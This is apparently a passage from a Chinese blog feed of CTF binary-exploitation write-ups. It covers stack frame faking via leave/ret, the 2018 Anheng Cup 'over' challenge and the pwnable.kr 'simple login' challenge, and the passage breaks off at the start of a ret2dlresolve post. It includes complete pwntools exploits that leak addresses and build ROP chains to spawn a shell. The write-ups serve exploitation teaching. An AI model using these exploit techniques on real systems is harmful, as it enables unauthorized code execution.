class="line-numbers-rows"><span></span><span></span></span></code></pre><p>出口点</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">leaveret #pop eip，弹出栈顶元素作为程序下一个执行地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中 leave 指令相当于</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov esp, ebp # 将ebp的值赋给esppop ebp # 弹出ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下面我们来仔细说一下基本的控制过程。</p><ol><li>在有栈溢出的程序执行 leave 时，其分为两个步骤<ul><li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li><li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。</li></ul></li><li>执行 ret 指令，会再次执行 leave ret 指令。</li><li>执行 leave 指令，其分为两个步骤<ul><li>mov esp, ebp ，这会将 esp 指向 ebp2。</li><li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li></ul></li><li>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行<ul><li>push ebp，会将 ebp2 值压入栈中。</li><li>mov ebp, esp，将 ebp 指向当前基地址。</li></ul></li></ol><p>此时的栈结构如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ebp|vebp2|leave ret addr|arg1|arg2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</li><li>程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</li></ol><p>可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。</p><h3 id="2018-安恒杯-over"><a href="#2018-安恒杯-over" class="headerlink" title="2018 安恒杯 over"></a>2018 安恒杯 over</h3><p>以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍</p><h4 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;99beb778a74c68e4ce1477b559391e860dd0e946, stripped[*] &#39;&#x2F;home&#x2F;m4x&#x2F;pwn_repo&#x2F;others_over&#x2F;over.over&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 NX 保护</p><h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>放到 IDA 中进行分析</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">sub_400676</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sub_400676</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">96uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了</p><h4 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak stack"></a>leak stack</h4><p>为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 ‘\0’, rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Breakpoint 1, 0x00000000004006b9 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────── RAX  0x7ffceaf11160 ◂— 0x3030303030303030 (&#39;00000000&#39;) RBX  0x0 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x60 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 (&#39;00000000&#39;) RSI  0x7ffceaf11160 ◂— 0x3030303030303030 (&#39;00000000&#39;) R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0 R9   0x7ff757354700 ◂— 0x7ff757354700 R10  0x37b R11  0x246 R12  0x400580 ◂— xor    ebp, ebp R13  0x7ffceaf112b0 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 (&#39;00000000&#39;) RIP  0x4006b9 ◂— call   0x400530─────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────── ► 0x4006b9    call   puts@plt &lt;0x400530&gt;        s: 0x7ffceaf11160 ◂— 0x3030303030303030 (&#39;00000000&#39;)   0x4006be    leave   0x4006bf    ret   0x4006c0    push   rbp   0x4006c1    mov    rbp, rsp   0x4006c4    sub    rsp, 0x10   0x4006c8    mov    dword ptr [rbp - 4], edi   0x4006cb    mov    qword ptr [rbp - 0x10], rsi   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] &lt;0x601060&gt;   0x4006d6    mov    ecx, 0   0x4006db    mov    edx, 2─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 (&#39;00000000&#39;)... ↓───────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────── ► f 0           4006b9   f 1           400715   f 2     7ff756de02b1 __libc_start_main+241Breakpoint *0x4006B9pwndbg&gt; stack 1500:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 (&#39;00000000&#39;)... ↓0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r150b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— &#39;.&#x2F;over.over&#39;0d:0068│                  0x7ffceaf111c8 ◂— 0x1000000000e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15pwndbg&gt; distance 0x7ffceaf111d0 0x7ffceaf111600x7ffceaf111d0-&gt;0x7ffceaf11160 is -0x70 bytes (-0xe words)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址 (如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。</p><p>比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 <code>sub_400676</code> 函数来 leak libc。<br>然后在下一次利用时就可以通过 rop 执行 <code>system(&quot;/bin/sh&quot;)</code> 或 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 的利用链, 这种方法更稳妥 (<code>system(&quot;/bin/sh&quot;)</code> 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./over.over"</span><span class="token keyword">def</span> <span class="token function">DEBUG</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"DEBUG: "</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./over.over"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./over.over"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcio<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">80</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x70</span>success<span class="token punctuation">(</span><span class="token string">"stack -> &#123;:#x&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#  DEBUG("b *0x4006B9\nc")</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'11111111'</span><span class="token punctuation">,</span> <span class="token number">0x400793</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x400676</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'1'</span><span class="token punctuation">,</span> stack<span class="token punctuation">,</span> <span class="token number">0x4006be</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc.address -> &#123;:#x&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret<span class="token operator">=</span><span class="token number">0x400793</span><span class="token triple-quoted-string string">'''$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"0x00000000000f5279 : pop rdx ; pop rsi ; ret'''</span>pop_rdx_pop_rsi_ret<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0xf5279</span>payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'22222222'</span><span class="token punctuation">,</span> pop_rdi_ret<span class="token punctuation">,</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pop_rdx_pop_rsi_ret<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token number">7</span><span class="token operator">*</span><span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'2'</span><span class="token punctuation">,</span> stack <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x4006be</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总的来说这种方法跟 stack pivot 差别并不是很大。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-覆盖ebp</title>
      <link href="//post/pwn-%E8%A6%86%E7%9B%96ebp.html"/>
      <url>//post/pwn-%E8%A6%86%E7%9B%96ebp.html</url>
      
        <content type="html"><![CDATA[<h1 id="覆盖ebp时rop"><a href="#覆盖ebp时rop" class="headerlink" title="覆盖ebp时rop"></a>覆盖ebp时rop</h1><p>话说其实一直都没有学习过只能覆盖ebp时的rop，是时候还下之前欠的技术栈了QAQ</p><span id="more"></span><h2 id="simple-login"><a href="#simple-login" class="headerlink" title="simple login"></a>simple login</h2><p>pwnable.kr的一题</p><p>Leave的作用相当  <code>mov esp,ebp</code>和<code>pop ebp</code><br>Win32汇编中局部变量的使用方法可以解释一个很有趣的现象：在DOS汇编的时候，如果在子程序中的push指令和pop指令不配对，那么返回的时候ret指令从堆栈里得到的肯定是错误的返回地址，程序也就死掉了。但在Win32汇编中，push指令和pop指令不配对可能在逻辑上产生错误，却不会影响子程序正常返回，原因就是在返回的时候esp不是靠相同数量的push和pop指令来保持一致的，而是靠leave指令从保存在ebp中的原始值中取回来的，也就是说，即使把esp改得一塌糊涂也不会影响到子程序的返回，当然，“窍门”就在ebp，把ebp改掉，程序就玩完了。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov esp, ebp  ；esp的内容为ebp指向的栈地址pop ebp       ；ebp &#x3D; ebp指向的栈地址中保存的值，esp + 4pop eip       ；程序转到 esp + 4 指向的地址执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>看一下程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-28h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-22h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-4h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1Eu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Authenticate : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%30s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xCu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">Base64Decode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">0xC</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong Length"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">auth</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token function">correct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_isoc99_scanf(&quot;%30s&quot;, &amp;s);</code></p><p>输入限制30个字节。<br>对输入进行了base64解密。<br>解密后的数据要小于等于12</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL4 __cdecl <span class="token function">auth</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s2<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-8h]</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>input<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  s2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calc_md5</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hash : %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"f87cd601aa7fedca99018a8be88eda34"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里进行了拷贝，可以看到int v4; // [esp+20h] [ebp-8h]但是实际上能拷贝的数据长度位12字节可以覆盖ebp。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0804930B                 leave.text:0804930C                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当auth正常返回的时候设置mov esp ebp(这个时候ebp还是原来的正确值)，pop ebp在我们可以设置ebp。pop eip不会影响。<br>程序继续向后运行…<br>运行到下一个</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">leave；ret这个时候会mov esp ebp设置esp(这里会把esp设置为刚才ebp的值也就是我们可以控制的内容)pop ebp 不会有影响。ret(也就是pop ip 也就是程序的执行流跳转到 esp+4的地址处执行)这个时候会劫持程序的执行流。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>exp很简单</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span><span class="token number">9003</span><span class="token punctuation">)</span>shell<span class="token operator">=</span><span class="token number">0x08049284</span>INput<span class="token operator">=</span><span class="token number">0x0811EB40</span>payload<span class="token operator">=</span><span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0xaaaaaaaa</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>INput<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Authenticate : "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-ret2dl</title>
      <link href="//post/pwn-ret2dl.html"/>
      <url>//post/pwn-ret2dl.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>话说其实一直都没有学习过ret2dl，还欠下的技术栈（二）</p><span id="more"></span><h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。</p><p>当一个程序第一次调用libc中的函数时，必须首先对libc中函数的真实地址进行重定位，而这个绑定寻找真实地址的过程由<code>dl_runtime_resolve</code>完成。<br><code>dl_runtime_resolve</code>需要两个参数，一个是<code>link_map=*(GOT[1])</code>,即链接器标志信息和<code>reloc_arg</code>(标志该函数重定位入口偏移)。</p><p>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果能够修改其中的某些内容使得最后动态链接器解析的符号是想要解析的符号，那么攻击就达成了</p><h2 id="0x01结构描述"><a href="#0x01结构描述" class="headerlink" title="0x01结构描述"></a>0x01结构描述</h2><p>需要了解3个结构以及他们之间的关系<br><img src="https://img-blog.csdnimg.cn/20190509224933472.png" alt="在这里插入图片描述"></p><p>_dll_runtime_resolve函数的2个参数<br><img src="https://img-blog.csdnimg.cn/20190509225100954.png" alt="在这里插入图片描述"><br>_dll_runtime_resolve函数的运行过程<br><img src="https://img-blog.csdnimg.cn/20190509225152272.png" alt="在这里插入图片描述"><br>2种利用方式<br><img src="https://img-blog.csdnimg.cn/20190509225223634.png" alt="在这里插入图片描述"></p><h2 id="0x02-利用二的示例"><a href="#0x02-利用二的示例" class="headerlink" title="0x02 利用二的示例"></a>0x02 利用二的示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buffer<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gcc fun.c -fno-stack-protector -m32 -o fun<span aria-hidden="true" 